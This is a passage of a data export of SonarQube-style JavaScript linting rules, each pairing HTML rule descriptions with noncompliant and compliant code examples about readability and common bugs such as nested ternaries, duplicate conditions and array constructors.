<h2>Noncompliant Code Example</h2>
<pre>
function getTitle(p) {
  return p.gender == ""male"" ? ""Mr. "" : p.isMarried() ? ""Mrs. "" : ""Miss "";  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function getTitle(p) {
  if (p.gender == ""male"") {
    return ""Mr. "";
  }
  return p.isMarried() ? ""Mrs. "" : ""Miss "";
}
</pre>",javascript:S3358,js,JavaScript,"<p>Just because you <em>can</em> do something, doesn't mean you should, and that's the case with nested ternary operations. Nesting ternary operators
results in the kind of code that may seem clear as day when you write it, but six months later will leave maintainers (or worse - future you)
scratching their heads and cursing.</p>
<p>Instead, err on the side of clarity, and use another line to express the nested operation as a separate statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function getTitle(p) {
  return p.gender == ""male"" ? ""Mr. "" : p.isMarried() ? ""Mrs. "" : ""Miss "";  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function getTitle(p) {
  if (p.gender == ""male"") {
    return ""Mr. "";
  }
  return p.isMarried() ? ""Mrs. "" : ""Miss "";
}
</pre>",Ternary operators should not be nested,[],MAJOR,['confusing'],CODE_SMELL
2015-04-07T09:32:39+0200,"<p>A <code>switch</code> and a chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will
be executed: the first one with a condition that evaluates to <code>true</code>.</p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and
at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior.</p>
<p>For a <code>switch</code>, if the first case ends with a <code>break</code>, the second case will never be executed, rendering it dead code. Worse
there is the risk in this situation that future maintenance will be done on the dead case, rather than on the one that's actually used.</p>
<p>On the other hand, if the first case does not end with a <code>break</code>, both cases will be executed, but future maintainers may not notice
that.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 1)  // Noncompliant
  moveWindowToTheBackground();


switch(i) {
  case 1:
    //...
    break;
  case 3:
    //...
    break;
  case 1:  // Noncompliant
    //...
    break;
  default:
    // ...
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 3)
  moveWindowToTheBackground();


switch(i) {
  case 1:
    //...
    break;
  case 3:
    //...
    break;
  default:
    // ...
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",javascript:S1862,js,JavaScript,"<p>A <code>switch</code> and a chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will
be executed: the first one with a condition that evaluates to <code>true</code>.</p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and
at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior.</p>
<p>For a <code>switch</code>, if the first case ends with a <code>break</code>, the second case will never be executed, rendering it dead code. Worse
there is the risk in this situation that future maintenance will be done on the dead case, rather than on the one that's actually used.</p>
<p>On the other hand, if the first case does not end with a <code>break</code>, both cases will be executed, but future maintainers may not notice
that.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 1)  // Noncompliant
  moveWindowToTheBackground();


switch(i) {
  case 1:
    //...
    break;
  case 3:
    //...
    break;
  case 1:  // Noncompliant
    //...
    break;
  default:
    // ...
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 3)
  moveWindowToTheBackground();


switch(i) {
  case 1:
    //...
    break;
  case 3:
    //...
    break;
  default:
    // ...
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>","Related ""if/else if"" statements and ""cases"" in a ""switch"" should not have the same condition",[],MAJOR,"['cert', 'pitfall', 'unused']",BUG
2017-04-27T12:27:57+0200,"<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>switch</code>/<code>if</code> chain at all. Note that this rule does not
apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code> clauses.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (b == 0) {  // Noncompliant
  doOneMoreThing();
}
else {
  doOneMoreThing();
}

let a = (b == 0) ? getValue() : getValue();   // Noncompliant

switch (i) {  // Noncompliant
  case 1:
    doSomething();
    break;
  case 2:
    doSomething();
    break;
  case 3:
    doSomething();
    break;
  default:
    doSomething();
}
</pre>",javascript:S3923,js,JavaScript,"<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>switch</code>/<code>if</code> chain at all. Note that this rule does not
apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code> clauses.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (b == 0) {  // Noncompliant
  doOneMoreThing();
}
else {
  doOneMoreThing();
}

let a = (b == 0) ? getValue() : getValue();   // Noncompliant

switch (i) {  // Noncompliant
  case 1:
    doSomething();
    break;
  case 2:
    doSomething();
    break;
  case 3:
    doSomething();
    break;
  default:
    doSomething();
}
</pre>",All branches in a conditional structure should not have exactly the same implementation,[],MAJOR,[],BUG
2016-10-12T08:06:49+0200,"<p>If a function does not return anything, it makes no sense to use its output. Specifically, passing it to another function, or assigning its
""result"" to a variable is probably a bug because such functions return <code>undefined</code>, which is probably not what was intended.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo() {
  console.log(""Hello, World!"");
}

a = foo();
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo() {
  console.log(""Hello, World!"");
}

foo();
</pre>",javascript:S3699,js,JavaScript,"<p>If a function does not return anything, it makes no sense to use its output. Specifically, passing it to another function, or assigning its
""result"" to a variable is probably a bug because such functions return <code>undefined</code>, which is probably not what was intended.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo() {
  console.log(""Hello, World!"");
}

a = foo();
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo() {
  console.log(""Hello, World!"");
}

foo();
</pre>",The output of functions that don't return anything should not be used,[],MAJOR,[],BUG
2013-06-19T07:34:52+0200,"<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>switch</code>, and <code>try</code> statements are key ingredients for making
what's known as ""Spaghetti code"".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
  if (condition1) {                  // Compliant - depth = 1
    /* ... */
    if (condition2) {                // Compliant - depth = 2
      /* ... */
      for(let i = 0; i &lt; 10; i++) {  // Compliant - depth = 3, not exceeding the limit
        /* ... */
        if (condition4) {            // Non-Compliant - depth = 4
          if (condition5) {          // Depth = 5, exceeding the limit, but issues are only reported on depth = 4
            /* ... */
          }
          return;
        }
      }
    }
  }
</pre>",javascript:NestedIfDepth,js,JavaScript,"<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>switch</code>, and <code>try</code> statements are key ingredients for making
what's known as ""Spaghetti code"".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
  if (condition1) {                  // Compliant - depth = 1
    /* ... */
    if (condition2) {                // Compliant - depth = 2
      /* ... */
      for(let i = 0; i &lt; 10; i++) {  // Compliant - depth = 3, not exceeding the limit
        /* ... */
        if (condition4) {            // Non-Compliant - depth = 4
          if (condition5) {          // Depth = 5, exceeding the limit, but issues are only reported on depth = 4
            /* ... */
          }
          return;
        }
      }
    }
  }
</pre>","Control flow statements ""if"", ""for"", ""while"", ""switch"" and ""try"" should not be nested too deeply","[{'key': 'maximumNestingLevel', 'htmlDesc': 'Maximum allowed &quot;if/for/while/switch/try&quot; statements nesting depth', 'defaultValue': '3', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2014-01-24T08:40:40+0100,"<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (variable) {
  case 0:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (variable == 0) {
  doSomething();
} else {
  doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.5 - Every switch statement shall have at least one case clause. </li>
  <li> MISRA C++:2008, 6-4-8 - Every switch statement shall have at least one case-clause. </li>
  <li> MISRA C:2012, 16.6 - Every switch statement shall have at least two switch-clauses </li>
</ul>",javascript:S1301,js,JavaScript,"<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (variable) {
  case 0:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (variable == 0) {
  doSomething();
} else {
  doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.5 - Every switch statement shall have at least one case clause. </li>
  <li> MISRA C++:2008, 6-4-8 - Every switch statement shall have at least one case-clause. </li>
  <li> MISRA C:2012, 16.6 - Every switch statement shall have at least two switch-clauses </li>
</ul>","""switch"" statements should have at least 3 ""case"" clauses",[],MINOR,"['bad-practice', 'misra']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x != undefined) {
  if (y === 2) {
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x != undefined &amp;&amp; y === 2) {
  // ...
}
</pre>",javascript:CollapsibleIfStatements,js,JavaScript,"<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x != undefined) {
  if (y === 2) {
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x != undefined &amp;&amp; y === 2) {
  // ...
}
</pre>","Collapsible ""if"" statements should be merged",[],MAJOR,['clumsy'],CODE_SMELL
2017-01-06T12:29:48+0100,"<p>Mixing up the order of operations will almost always yield unexpected results.</p>
<p>Similarly, mis-applied negation will also yield bad results. For instance consider the difference between <code>!key in dict</code> and <code>!(key
in dict)</code>. The first looks for a boolean value (<code>!key</code>) in <code>dict</code>, and the other looks for a string and inverts the
result. <code>!obj instanceof SomeClass</code> has the same problem.</p>
<p>This rule raises an issue when the left operand of an <code>in</code> or <code>instanceof</code> operator is negated.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (!""prop"" in myObj) {  // Noncompliant;  ""in"" operator is checking property ""false""
  doTheThing();  // this block will be never executed
}

if (!foo instanceof MyClass) {  // Noncompliant; ""!foo"" returns a boolean, which is not an instance of anything
  doTheOtherThing();  // this block is never executed
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (!(""prop"" in myObj)) {
  doTheThing();
}

if (!(foo instanceof MyClass)) {
  doTheOtherThing();
}
</pre>",javascript:S3812,js,JavaScript,"<p>Mixing up the order of operations will almost always yield unexpected results.</p>
<p>Similarly, mis-applied negation will also yield bad results. For instance consider the difference between <code>!key in dict</code> and <code>!(key
in dict)</code>. The first looks for a boolean value (<code>!key</code>) in <code>dict</code>, and the other looks for a string and inverts the
result. <code>!obj instanceof SomeClass</code> has the same problem.</p>
<p>This rule raises an issue when the left operand of an <code>in</code> or <code>instanceof</code> operator is negated.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (!""prop"" in myObj) {  // Noncompliant;  ""in"" operator is checking property ""false""
  doTheThing();  // this block will be never executed
}

if (!foo instanceof MyClass) {  // Noncompliant; ""!foo"" returns a boolean, which is not an instance of anything
  doTheOtherThing();  // this block is never executed
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (!(""prop"" in myObj)) {
  doTheThing();
}

if (!(foo instanceof MyClass)) {
  doTheOtherThing();
}
</pre>","Results of ""in"" and ""instanceof"" should be negated rather than operands",[],CRITICAL,[],BUG
2018-10-25T10:33:52+0200,"<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having less than 10 characters are excluded as well as literals matching <code>/^\w*$/</code>.
String literals inside import/export statements and JSX attributes are also ignored.</p>",javascript:S1192,js,JavaScript,"<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having less than 10 characters are excluded as well as literals matching <code>/^\w*$/</code>.
String literals inside import/export statements and JSX attributes are also ignored.</p>",String literals should not be duplicated,"[{'key': 'threshold', 'htmlDesc': 'Number of times a literal must be duplicated to trigger an issue.', 'defaultValue': '3', 'type': 'INTEGER'}]",CRITICAL,['design'],CODE_SMELL
2015-04-07T09:32:39+0200,"<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (a == b &amp;&amp; a == b) { // if the first one is true, the second one is too
  doX();
}
if (a &gt; a) { // always false
  doW();
}

var j = 5 / 5; //always 1
var k = 5 - 5; //always 0
</pre>
<h2>Exceptions</h2>
<p>The specific case of testing one variable against itself is a valid test for <code>NaN</code> and is therefore ignored.</p>
<p>Similarly, left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored. </p>
<p>Moreover comma operator <code>,</code> and <code>instanceof</code> operator are ignored as there are use-cases when there usage is valid.</p>
<pre>
if (f !== f) { // test for NaN value
  console.log(""f is NaN"");
}

var i = 1 &lt;&lt; 1; // Compliant
var j = a &lt;&lt; a; // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=javascript%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>",javascript:S1764,js,JavaScript,"<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (a == b &amp;&amp; a == b) { // if the first one is true, the second one is too
  doX();
}
if (a &gt; a) { // always false
  doW();
}

var j = 5 / 5; //always 1
var k = 5 - 5; //always 0
</pre>
<h2>Exceptions</h2>
<p>The specific case of testing one variable against itself is a valid test for <code>NaN</code> and is therefore ignored.</p>
<p>Similarly, left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored. </p>
<p>Moreover comma operator <code>,</code> and <code>instanceof</code> operator are ignored as there are use-cases when there usage is valid.</p>
<pre>
if (f !== f) { // test for NaN value
  console.log(""f is NaN"");
}

var i = 1 &lt;&lt; 1; // Compliant
var j = a &lt;&lt; a; // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> {rule:javascript:S1656} - Implements a check on <code>=</code>. </li>
</ul>",Identical expressions should not be used on both sides of a binary operator,[],MAJOR,['cert'],BUG
2018-10-25T10:33:52+0200,"<p>Object literal syntax, which initializes an object's properties inside the object declaration is cleaner and clearer than the alternative: creating
an empty object, and then giving it properties one by one.</p>
<p>An issue is raised when the following pattern is met:</p>
<ul>
  <li> An empty object is created. </li>
  <li> A consecutive single-line statement adds a property to the created object. </li>
</ul>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
let person = {};  // Noncompliant
person.firstName = ""John"";
person.middleInitial = ""Q"";
person.lastName = ""Public"";
</pre>
<h2>Compliant Solution</h2>
<pre>
let person = {
  firstName: ""John"",
  middleInitial: ""Q"",
  lastName: ""Public"",
}
</pre>",javascript:S2428,js,JavaScript,"<p>Object literal syntax, which initializes an object's properties inside the object declaration is cleaner and clearer than the alternative: creating
an empty object, and then giving it properties one by one.</p>
<p>An issue is raised when the following pattern is met:</p>
<ul>
  <li> An empty object is created. </li>
  <li> A consecutive single-line statement adds a property to the created object. </li>
</ul>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
let person = {};  // Noncompliant
person.firstName = ""John"";
person.middleInitial = ""Q"";
person.lastName = ""Public"";
</pre>
<h2>Compliant Solution</h2>
<pre>
let person = {
  firstName: ""John"",
  middleInitial: ""Q"",
  lastName: ""Public"",
}
</pre>",Object literal syntax should be used,[],MINOR,['clumsy'],CODE_SMELL
2018-02-14T07:15:15+0100,"<p>When two functions have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but
may be confusing to maintainers. In the latter case, the code should be refactored.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
function calculateCode() {
  doTheThing();
  doOtherThing();
  return code;
}

function getName() {  // Noncompliant
  doTheThing();
  doOtherThing();
  return code;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function calculateCode() {
  doTheThing();
  doOtherThing();
  return code;
}

function getName() {
  return calculateCode();
}
</pre>
<h2>Exceptions</h2>
<p>Functions with fewer than 3 lines are ignored.</p>",javascript:S4144,js,JavaScript,"<p>When two functions have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but
may be confusing to maintainers. In the latter case, the code should be refactored.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
function calculateCode() {
  doTheThing();
  doOtherThing();
  return code;
}

function getName() {  // Noncompliant
  doTheThing();
  doOtherThing();
  return code;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function calculateCode() {
  doTheThing();
  doOtherThing();
  return code;
}

function getName() {
  return calculateCode();
}
</pre>
<h2>Exceptions</h2>
<p>Functions with fewer than 3 lines are ignored.</p>",Functions should not have identical implementations,[],MAJOR,"['confusing', 'duplicate', 'suspicious']",CODE_SMELL
2018-02-14T07:15:15+0100,"<p>It is highly suspicious when a value is saved for a key or index and then unconditionally overwritten. Such replacements are likely in error.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
 fruits[1] = ""banana"";
 fruits[1] = ""apple"";  // Noncompliant - value on index 1 is overwritten

 myMap.set(""key"", 1);
 myMap.set(""key"", 2); // Noncompliant - value for key ""key"" is replaced

 mySet.add(1);
 mySet.add(1); // Noncompliant - element is already in the set
</pre>",javascript:S4143,js,JavaScript,"<p>It is highly suspicious when a value is saved for a key or index and then unconditionally overwritten. Such replacements are likely in error.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
 fruits[1] = ""banana"";
 fruits[1] = ""apple"";  // Noncompliant - value on index 1 is overwritten

 myMap.set(""key"", 1);
 myMap.set(""key"", 2); // Noncompliant - value for key ""key"" is replaced

 mySet.add(1);
 mySet.add(1); // Noncompliant - element is already in the set
</pre>",Collection elements should not be replaced unconditionally,[],MAJOR,['suspicious'],BUG
2013-06-19T07:34:52+0200,An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.,common-js:InsufficientBranchCoverage,js,JavaScript,An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.,Branches should have sufficient coverage by tests,"[{'key': 'minimumBranchCoverageRatio', 'defaultValue': '65', 'type': 'FLOAT'}]",MAJOR,['bad-practice'],CODE_SMELL
2013-06-19T07:34:52+0200,An issue is created on a file as soon as there is at least one block of duplicated code on this file,common-js:DuplicatedBlocks,js,JavaScript,An issue is created on a file as soon as there is at least one block of duplicated code on this file,Source files should not have any duplicated blocks,[],MAJOR,['pitfall'],CODE_SMELL
2015-10-13T10:34:28+0200,Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.,common-js:FailedUnitTests,js,JavaScript,Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.,Failed unit tests should be fixed,[],MAJOR,[],BUG
2013-06-19T07:34:52+0200,An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.,common-js:InsufficientCommentDensity,js,JavaScript,An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.,Source files should have a sufficient density of comment lines,"[{'key': 'minimumCommentDensity', 'defaultValue': '25', 'type': 'FLOAT'}]",MAJOR,['convention'],CODE_SMELL
2013-06-19T07:34:52+0200,An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.,common-js:InsufficientLineCoverage,js,JavaScript,An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.,Lines should have sufficient coverage by tests,"[{'key': 'minimumLineCoverageRatio', 'defaultValue': '65', 'type': 'FLOAT'}]",MAJOR,['bad-practice'],CODE_SMELL
2015-10-13T10:34:28+0200,Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.,common-js:SkippedUnitTests,js,JavaScript,Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.,Skipped unit tests should be either removed or fixed,[],MAJOR,['pitfall'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Array literals should always be preferred to Array constructors.</p>
<p>Array constructors are error-prone due to the way their arguments are interpreted. If more than one argument is used, the array length will be
equal to the number of arguments. However, using a single argument will have one of three consequences:</p>
<ul>
  <li> If the argument is a number and it is a natural number the length will be equal to the value of the argument. </li>
</ul>
<pre>
let arr = new Array(3); // [empty Ãƒâ€” 3]
</pre>
<ul>
  <li> If the argument is a number, but not a natural number an exception will be thrown. </li>
</ul>
<pre>
let arr = new Array(3.14);  // RangeError: Invalid array length
</pre>
<ul>
  <li> Otherwise the array will have one element with the argument as its value. </li>
</ul>
<pre>
let arr = new Array(""3"");  // [""3""]
</pre>
<p>Note that even if you set the length of an array, it will be empty. That is, it will have the number of elements you declared, but they won't
contain anything, so no callbacks will be applied to the array elements.</p>
<p>For these reasons, if someone changes the code to pass 1 argument instead of 2 arguments, the array might not have the expected length. To avoid
these kinds of weird cases, always use the more readable array literal initialization format.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let myArray = new Array(x1, x2, x3);   // Noncompliant. Results in 3-element array.
let emptyArray = new Array();          // Noncompliant. Results in 0-element array.

let unstableArray = new Array(n);      // Noncompliant. Variable in results.

let arr = new Array(3); // Noncompliant; empty array of length 3
arr.foreach((x) =&gt; alert(""Hello "" + x)); // callback is not executed because there's nothing in arr
let anotherArr = arr.map(() =&gt; 42); // anotherArr is also empty because callback didn't execute
</pre>
<h2>Compliant Solution</h2>
<pre>
let myArray = [x1, x2, x3];
let emptyArray = [];

// if ""n"" is the only array element
let unstableArray = [n];
// or,  if ""n"" is the array length (since ES 2015)
let unstableArray = Array.from({length: n});

let arr = [""Elena"", ""Mike"", ""Sarah""];
arr.foreach((x) =&gt; alert(""Hello "" + x));
let anotherArr = arr.map(() =&gt; 42);  // anotherArr now holds 42 in each element
</pre>",javascript:ArrayAndObjectConstructors,js,JavaScript,"<p>Array literals should always be preferred to Array constructors.</p>
<p>Array constructors are error-prone due to the way their arguments are interpreted. If more than one argument is used, the array length will be
equal to the number of arguments. However, using a single argument will have one of three consequences:</p>
<ul>
  <li> If the argument is a number and it is a natural number the length will be equal to the value of the argument. </li>
</ul>
<pre>
let arr = new Array(3); // [empty Ãƒâ€” 3]
</pre>
<ul>
  <li> If the argument is a number, but not a natural number an exception will be thrown. </li>
</ul>
<pre>
let arr = new Array(3.14);  // RangeError: Invalid array length
</pre>
<ul>
  <li> Otherwise the array will have one element with the argument as its value. </li>
</ul>
<pre>
let arr = new Array(""3"");  // [""3""]
</pre>
<p>Note that even if you set the length of an array, it will be empty. That is, it will have the number of elements you declared, but they won't
contain anything, so no callbacks will be applied to the array elements.</p>
<p>For these reasons, if someone changes the code to pass 1 argument instead of 2 arguments, the array might not have the expected length. To avoid
these kinds of weird cases, always use the more readable array literal initialization format.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let myArray = new Array(x1, x2, x3);   // Noncompliant. Results in 3-element array.
let emptyArray = new Array();          // Noncompliant. Results in 0-element array.

let unstableArray = new Array(n);      // Noncompliant. Variable in results.

let arr = new Array(3); // Noncompliant; empty array of length 3
arr.foreach((x) =&gt; alert(""Hello "" + x)); // callback is not executed because there's nothing in arr
let anotherArr = arr.map(() =&gt; 42); // anotherArr is also empty because callback didn't execute
</pre>
<h2>Compliant Solution</h2>
<pre>
let myArray = [x1, x2, x3];
let emptyArray = [];

// if ""n"" is the only array element
let unstableArray = [n];
// or,  if ""n"" is the array length (since ES 2015)
let unstableArray = Array.from({length: n});

let arr = [""Elena"", ""Mike"", ""Sarah""];
arr.foreach((x) =&gt; alert(""Hello "" + x));
let anotherArr = arr.map(() =&gt; 42);  // anotherArr now holds 42 in each element
</pre>",Array constructors should not be used,[],MINOR,['suspicious'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The bitwise operators <code>&amp;</code>, <code>|</code> can be mistaken for the boolean operators <code>&amp;&amp;</code> and <code>||</code>.
</p>
<p>This rule raises an issue when <code>&amp;</code> or <code>|</code> is used in a boolean context.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (a &amp; b) { ... } // Noncompliant; &amp; used in error
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a &amp;&amp; b) { ... }
</pre>
<h2>Exceptions</h2>
<p>When a file contains other bitwise operations, (<code>^</code>, <code>&lt;&lt;</code>, <code>&gt;&gt;&gt;</code>, <code>&gt;&gt;</code>,
<code>~</code>, <code>&amp;=</code>, <code>^=</code>, <code>|=</code>, <code>&lt;&lt;=</code>, <code>&gt;&gt;=</code>, <code>&gt;&gt;&gt;=</code> and
<code>&amp;</code> or <code>|</code> used with a numeric literal as the right operand) all issues in the file are ignored, because it is evidence that
bitwise operations are truly intended in the file.</p>",javascript:BitwiseOperators,js,JavaScript,"<p>The bitwise operators <code>&amp;</code>, <code>|</code> can be mistaken for the boolean operators <code>&amp;&amp;</code> and <code>||</code>.
</p>
<p>This rule raises an issue when <code>&amp;</code> or <code>|</code> is used in a boolean context.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (a &amp; b) { ... } // Noncompliant; &amp; used in error
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a &amp;&amp; b) { ... }
</pre>
<h2>Exceptions</h2>
<p>When a file contains other bitwise operations, (<code>^</code>, <code>&lt;&lt;</code>, <code>&gt;&gt;&gt;</code>, <code>&gt;&gt;</code>,
<code>~</code>, <code>&amp;=</code>, <code>^=</code>, <code>|=</code>, <code>&lt;&lt;=</code>, <code>&gt;&gt;=</code>, <code>&gt;&gt;&gt;=</code> and
<code>&amp;</code> or <code>|</code> used with a numeric literal as the right operand) all issues in the file are ignored, because it is evidence that
bitwise operations are truly intended in the file.</p>",Bitwise operators should not be used in boolean contexts,[],MAJOR,[],BUG
2013-06-19T07:34:52+0200,"<p><code>eval</code> is used to evaluate a string as JavaScript code, and <code>arguments</code> is used to access function arguments through indexed
properties. As a consequence, <code>eval</code> and <code>arguments</code> should not be bound or assigned, because doing so would overwrite the
original definitions of those two reserved words.</p>
<p>What's more, using either of those two names to assign or bind will generate an error in JavaScript strict mode code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
eval = 17; // Noncompliant
arguments++; // Noncompliant
++eval; // Noncompliant
var obj = { set p(arguments) { } }; // Noncompliant
var eval; // Noncompliant
try { } catch (arguments) { } // Noncompliant
function x(eval) { } // Noncompliant
function arguments() { } // Noncompliant
var y = function eval() { }; // Noncompliant
var f = new Function(""arguments"", ""return 17;""); // Noncompliant

function fun() {
  if (arguments.length == 0) { // Compliant
    // do something
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
result = 17;
args++;
++result;
var obj = { set p(arg) { } };
var result;
